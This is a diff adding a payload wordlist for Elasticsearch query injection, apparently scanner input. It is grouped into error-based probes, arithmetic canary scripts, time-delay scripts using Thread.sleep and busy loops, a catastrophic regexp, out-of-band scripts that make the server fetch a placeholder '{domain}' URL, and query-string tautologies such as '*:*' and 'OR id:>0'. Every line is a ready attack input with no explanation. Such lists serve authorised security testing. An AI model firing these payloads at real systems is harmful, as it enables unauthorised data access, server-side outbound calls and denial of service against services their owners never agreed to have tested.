@@ -1,0 +1,30 @@
+##Elasticsearch Injection - Error-Based##
+{"query":{"invalid_query_type":{}}}
+{"query":{"match":{"_all":{"query":"test","invalid_param":true}}}}
+}{
+{"script":{"source":"invalid syntax here"}}
+{"query":{"bool":{"must":[{"match":{"nonexistent_field_xyz":""}}],"invalid_clause":{}}}}
+{"query":{"range":{"id":{"gte":null,"format":"bad"}}}}
+{"size":-1}
+##Elasticsearch Injection - Math-Based (Canary: 1337)##
+{"script_fields":{"x":{"script":"7*191"}}}
+{"script_fields":{"x":{"script":{"source":"return 7*191"}}}}
+{"query":{"script":{"script":{"source":"doc['id'].value == 7*191"}}}}
+{"aggs":{"x":{"sum":{"script":"7*191"}}}}
+{"aggs":{"x":{"bucket_script":{"buckets_path":{},"script":"7*191"}}}}
+{"query":{"function_score":{"script_score":{"script":"7*191"}}}}
+##Elasticsearch Injection - Timing-Based##
+{"query":{"script":{"script":{"source":"Thread.sleep(5000); return true"}}}}
+{"script_fields":{"x":{"script":"Thread.sleep(5000); return 1"}}}
+{"script_fields":{"x":{"script":{"source":"long t=System.currentTimeMillis();while(System.currentTimeMillis()-t<5000){} return 1"}}}}
+{"query":{"regexp":{"name":".*.*.*.*.*.*.*.*.*.*a"}}}
+##Elasticsearch Injection - OOB##
+{"script_fields":{"x":{"script":"new URL('http://{domain}/es').text"}}}
+{"script_fields":{"x":{"script":{"source":"new URL('http://{domain}/es-painless').text"}}}}
+{"script_fields":{"x":{"script":"'http://{domain}/es-rt'.execute().text"}}}
+##Elasticsearch Injection - Query String##
+_exists_:name
+*:*
+name:admin OR _exists_:role
+id:1337 OR id:>0
+name:/.*admin.*/
